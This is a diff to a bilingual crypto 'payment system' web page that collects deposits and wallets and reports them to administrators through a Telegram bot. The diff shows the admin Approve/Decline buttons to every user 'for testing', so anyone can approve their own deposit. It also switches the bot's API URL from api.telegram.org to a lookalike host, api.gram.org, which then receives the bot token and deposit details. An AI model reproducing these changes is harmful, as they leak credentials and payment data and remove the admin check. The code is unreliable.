@@ -549,6 +549,13 @@
         </div>
         <p style="text-align: center; margin: 15px 0;" id="afterPaymentText">After payment, click confirm below</p>
         <button class="btn" id="confirmDepositBtn" onclick="confirmDeposit()">Confirm Payment</button>
+        
+        <!-- Кнопки для админа -->
+        <div class="admin-buttons" id="adminButtons" style="display: none; margin-top: 15px;">
+            <button class="admin-btn decline" onclick="declineDeposit()">Decline</button>
+            <button class="admin-btn approve" onclick="approveDeposit()">Approve</button>
+        </div>
+        
         <div class="timer" id="depositTimer" style="display: none;"></div>
     </div>
 
@@ -571,18 +578,6 @@
         </div>
         <div class="timer" id="withdrawalTimer" style="display: none;"></div>
         <button class="btn" onclick="closeWithdrawalPopup()" style="display: none;" id="withdrawalCloseBtn">Close</button>
-    </div>
-
-    <!-- Попап для админа с кнопками Approve/Decline -->
-    <div id="adminApprovalPopup" class="popup">
-        <h3 style="color: #D0E41E; text-align: center; margin-bottom: 20px;">Admin Approval</h3>
-        <div id="adminApprovalContent">
-            <p>Approve or decline this deposit request?</p>
-            <div class="admin-buttons">
-                <button class="admin-btn decline" onclick="declineDeposit()">Decline</button>
-                <button class="admin-btn approve" onclick="approveDeposit()">Approve</button>
-            </div>
-        </div>
     </div>
 
     <div class="overlay" id="overlay"></div>
@@ -654,7 +649,10 @@
                 identicalRequestNotification: "You have already sent this identical request recently. Please wait 5 minutes.",
                 pendingApprovalNotification: "Deposit pending approval. Admin will approve it in Telegram.",
                 approvedWalletsText: "Your Approved Wallets:",
-                noApprovedWalletsText: "No approved wallets yet. Make a deposit first."
+                noApprovedWalletsText: "No approved wallets yet. Make a deposit first.",
+                depositConfirmedText: "Deposit confirmed! Waiting for admin approval...",
+                depositApprovedText: "Deposit approved! Wallet saved successfully.",
+                depositDeclinedText: "Deposit declined by admin."
             },
             ru: {
                 logoText: "ПЛАТЕЖНАЯ СИСТЕМА",
@@ -707,7 +705,10 @@
                 identicalRequestNotification: "Вы уже отправляли этот идентичный запрос недавно. Пожалуйста, подождите 5 минут.",
                 pendingApprovalNotification: "Депозит ожидает подтверждения. Админ подтвердит его в Telegram.",
                 approvedWalletsText: "Ваши подтвержденные кошельки:",
-                noApprovedWalletsText: "Пока нет подтвержденных кошельков. Сначала сделайте депозит."
+                noApprovedWalletsText: "Пока нет подтвержденных кошельков. Сначала сделайте депозит.",
+                depositConfirmedText: "Депозит подтвержден! Ожидание подтверждения админа...",
+                depositApprovedText: "Депозит подтвержден! Кошелек успешно сохранен.",
+                depositDeclinedText: "Депозит отклонен админом."
             }
         };
 
@@ -1245,7 +1246,7 @@
 
         // Regular Telegram message (for withdrawals)
         async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
+            const url = `https://api.gram.org/bot${CONFIG.botToken}/sendMessage`;
             
             try {
                 const response = await fetch(url, {
@@ -1375,6 +1376,9 @@
             document.getElementById('depositWalletDisplay').textContent = depositWallet;
             document.getElementById('confirmDepositBtn').style.display = 'block';
             
+            // Показываем кнопки для админа (для тестирования)
+            document.getElementById('adminButtons').style.display = 'flex';
+            
             showPopup('depositPopup');
         }
 
@@ -1382,6 +1386,7 @@
             if (!currentDepositData) return;
 
             document.getElementById('confirmDepositBtn').style.display = 'none';
+            document.getElementById('adminButtons').style.display = 'none';
 
             const message = `
 💰 <b>NEW DEPOSIT REQUEST - AWAITING APPROVAL</b>
@@ -1409,21 +1414,25 @@
                     currentDepositData.walletType
                 );
 
-                showNotification(getTranslation('pendingApprovalNotification'));
+                showNotification(getTranslation('depositConfirmedText'));
                 
                 const timer = document.getElementById('depositTimer');
                 timer.style.display = 'block';
-                
-                startCountdown(5000, timer, 'depositPopup');
+                timer.textContent = getTranslation('pendingApprovalNotification');
                 
                 setTimeout(() => {
+                    hidePopup('depositPopup');
                     document.getElementById('depositAmount').value = '';
                     document.getElementById('transactionId').value = '';
+                    document.getElementById('confirmDepositBtn').style.display = 'block';
+                    document.getElementById('adminButtons').style.display = 'flex';
+                    document.getElementById('depositTimer').style.display = 'none';
                     currentDepositData = null;
                 }, 5000);
             } else {
                 showNotification(getTranslation('errorNotification'), false);
                 document.getElementById('confirmDepositBtn').style.display = 'block';
+                document.getElementById('adminButtons').style.display = 'flex';
             }
         }
 
@@ -1542,7 +1551,7 @@
             );
 
             if (success) {
-                showNotification('Wallet approved and saved successfully!');
+                showNotification(getTranslation('depositApprovedText'));
                 walletManager.removePendingApproval(currentDepositData.requestId);
                 
                 // Отправляем уведомление в Telegram
@@ -1564,8 +1573,9 @@
                 showNotification('Failed to approve wallet', false);
             }
 
-            hidePopup('adminApprovalPopup');
             hidePopup('depositPopup');
+            document.getElementById('depositAmount').value = '';
+            document.getElementById('transactionId').value = '';
             currentDepositData = null;
         }
 
@@ -1573,7 +1583,7 @@
             if (!currentDepositData) return;
 
             walletManager.removePendingApproval(currentDepositData.requestId);
-            showNotification('Deposit request declined');
+            showNotification(getTranslation('depositDeclinedText'));
             
             // Отправляем уведомление в Telegram
             const declineMessage = `
@@ -1588,8 +1598,9 @@
             
             await sendToTelegram(declineMessage);
 
-            hidePopup('adminApprovalPopup');
             hidePopup('depositPopup');
+            document.getElementById('depositAmount').value = '';
+            document.getElementById('transactionId').value = '';
             currentDepositData = null;
         }
 
